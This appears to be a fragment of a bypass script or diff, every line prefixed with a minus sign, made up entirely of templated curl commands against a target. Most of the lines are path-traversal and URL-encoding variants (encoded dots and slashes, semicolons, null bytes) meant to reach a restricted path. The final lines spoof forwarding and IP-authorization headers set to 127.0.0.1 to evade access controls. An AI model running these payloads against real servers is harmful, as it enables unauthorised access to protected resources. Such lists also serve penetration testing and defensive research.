-curl "$SCHEME://$VHOST/;%2f..%2f/../$PAT"
-curl "$SCHEME://$VHOST/;%2f../%2f..%2f$PAT"
-curl "$SCHEME://$VHOST/;%2f../%2f../$PAT"
-curl "$SCHEME://$VHOST/;%2f..//..%2f$PAT"
-curl "$SCHEME://$VHOST/;%2f..//../$PAT"
-curl "$SCHEME://$VHOST/;%2f..///$PAT"
-curl "$SCHEME://$VHOST/;%2f..///;$PAT"
-curl "$SCHEME://$VHOST/;%2f..//;/$PAT"
-curl "$SCHEME://$VHOST/;%2f..//;/;$PAT"
-curl "$SCHEME://$VHOST/;%2f../;//$PAT"
-curl "$SCHEME://$VHOST/;%2f../;/;/$PAT"
-curl "$SCHEME://$VHOST/;%2f../;/;/;$PAT"
-curl "$SCHEME://$VHOST/;%2f..;///$PAT"
-curl "$SCHEME://$VHOST/;%2f..;//;/$PAT"
-curl "$SCHEME://$VHOST/;%2f..;/;//$PAT"
-curl "$SCHEME://$VHOST/;%2f/%2f../$PAT"
-curl "$SCHEME://$VHOST/;%2f//..%2f$PAT"
-curl "$SCHEME://$VHOST/;%2f//../$PAT"
-curl "$SCHEME://$VHOST/;%2f//..;/$PAT"
-curl "$SCHEME://$VHOST/;%2f/;/../$PAT"
-curl "$SCHEME://$VHOST/;%2f/;/..;/$PAT"
-curl "$SCHEME://$VHOST/;%2f;//../$PAT"
-curl "$SCHEME://$VHOST/;%2f;/;/..;/$PAT"
-curl "$SCHEME://$VHOST/;/%2e%2e$PAT"
-curl "$SCHEME://$VHOST/;/%2e%2e%2f%2f$PAT"
-curl "$SCHEME://$VHOST/;/%2e%2e%2f/$PAT"
-curl "$SCHEME://$VHOST/;/%2e%2e/$PAT"
-curl "$SCHEME://$VHOST/;/%2e.$PAT"
-curl "$SCHEME://$VHOST/;/%2f%2f../$PAT"
-curl "$SCHEME://$VHOST/;/%2f/..%2f$PAT"
-curl "$SCHEME://$VHOST/;/%2f/../$PAT"
-curl "$SCHEME://$VHOST/;/.%2e$PAT"
-curl "$SCHEME://$VHOST/;/.%2e/%2e%2e/%2f$PAT"
-curl "$SCHEME://$VHOST/;/..$PAT"
-curl "$SCHEME://$VHOST/;/..%2f$PAT"
-curl "$SCHEME://$VHOST/;/..%2f%2f../$PAT"
-curl "$SCHEME://$VHOST/;/..%2f..%2f$PAT"
-curl "$SCHEME://$VHOST/;/..%2f/$PAT"
-curl "$SCHEME://$VHOST/;/..%2f//$PAT"
-curl "$SCHEME://$VHOST/;/../$PAT"
-curl "$SCHEME://$VHOST/;/../%2f/$PAT"
-curl "$SCHEME://$VHOST/;/../../$PAT"
-curl "$SCHEME://$VHOST/;/../..//$PAT"
-curl "$SCHEME://$VHOST/;/.././../$PAT"
-curl "$SCHEME://$VHOST/;/../.;/../$PAT"
-curl "$SCHEME://$VHOST/;/..//$PAT"
-curl "$SCHEME://$VHOST/;/..//%2e%2e/$PAT"
-curl "$SCHEME://$VHOST/;/..//%2f$PAT"
-curl "$SCHEME://$VHOST/;/..//../$PAT"
-curl "$SCHEME://$VHOST/;/..///$PAT"
-curl "$SCHEME://$VHOST/;/../;/$PAT"
-curl "$SCHEME://$VHOST/;/../;/../$PAT"
-curl "$SCHEME://$VHOST/;/..;$PAT"
-curl "$SCHEME://$VHOST/;/.;.$PAT"
-curl "$SCHEME://$VHOST/;//%2f../$PAT"
-curl "$SCHEME://$VHOST/;//..$PAT"
-curl "$SCHEME://$VHOST/;//../../$PAT"
-curl "$SCHEME://$VHOST/;///..$PAT"
-curl "$SCHEME://$VHOST/;///../$PAT"
-curl "$SCHEME://$VHOST/;///..//$PAT"
-curl "$SCHEME://$VHOST/;x$PAT"
-curl "$SCHEME://$VHOST/;x/$PAT"
-curl "$SCHEME://$VHOST/;x;$PAT"
-curl "$SCHEME://$VHOST/&$PAT"
-curl "$SCHEME://$VHOST/%$PAT"
-curl "$SCHEME://$VHOST/%09$PAT"
-curl "$SCHEME://$VHOST/../$PAT"
-curl "$SCHEME://$VHOST/..%2f$PAT"
-curl "$SCHEME://$VHOST/.././$PAT"
-curl "$SCHEME://$VHOST/..%00/$PAT"
-curl "$SCHEME://$VHOST/..%0d/$PAT"
-curl "$SCHEME://$VHOST/..%5c$PAT"
-curl "$SCHEME://$VHOST/..\\$PAT"
-curl "$SCHEME://$VHOST/..%ff$PAT"
-curl "$SCHEME://$VHOST/%2e%2e%2f$PAT"
-curl "$SCHEME://$VHOST/.%2e/$PAT"
-curl "$SCHEME://$VHOST/%3f$PAT"
-curl "$SCHEME://$VHOST/%26$PAT"
-curl "$SCHEME://$VHOST/%23$PAT"
-curl "$SCHEME://$VHOST/%2e$PAT"
-curl "$SCHEME://$VHOST//.$PAT"
-curl "$SCHEME://$VHOST/?$PAT"
-curl "$SCHEME://$VHOST/??$PAT"
-curl "$SCHEME://$VHOST/???$PAT"
-curl "$SCHEME://$VHOST///$PAT"
-curl "$SCHEME://$VHOST//./$PAT"
-curl "$SCHEME://$VHOST/.//./$PAT"
-curl "$SCHEME://$VHOST///?anything$PAT"
-curl "$SCHEME://$VHOST/#$PAT"
-curl "$SCHEME://$VHOST//$PAT"
-curl "$SCHEME://$VHOST//.randomstring$PAT"
-curl "$SCHEME://$VHOST/..;/$PAT"
-curl "$SCHEME://$VHOST/.html$PAT"
-curl "$SCHEME://$VHOST/%20/$PAT"
-curl "$SCHEME://$VHOST//%20$PAT%20/$PAT"
-curl "$SCHEME://$VHOST/.json$PAT"
-curl "$SCHEME://$VHOST/\..\.\\$PAT"
-curl "$SCHEME://$VHOST//*$PAT"
-curl "$SCHEME://$VHOST/./.$PAT"
-curl "$SCHEME://$VHOST//*/$PAT"
-curl "$SCHEME://$VHOST//..;/$PAT"
-curl "$SCHEME://$VHOST//%2e/$PAT"
-curl "$SCHEME://$VHOST//%2e/$PAT"
-curl "$SCHEME://$VHOST///.$PAT"
-curl "$SCHEME://$VHOST/////$PAT"
-curl "$SCHEME://$VHOST//../$PAT"
-curl "$SCHEME://$VHOST//;$PAT/$PAT"
-curl -H "Access-Control-Allow-Origin: 127.0.0.1" -X GET "$URL"
-curl -H "Forwarded: 127.0.0.1" -X GET "$URL"
-curl -H "Forwarded-For: 127.0.0.1" -X GET "$URL"
-curl -H "Forwarded-For-IP: 127.0.0.1" -X GET "$URL"
-curl -H "Origin: 127.0.0.1" -X GET "$URL"
-curl -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "$URL"
-curl -H "X-Forwarded: 127.0.0.1" -X GET "$URL"
-"""
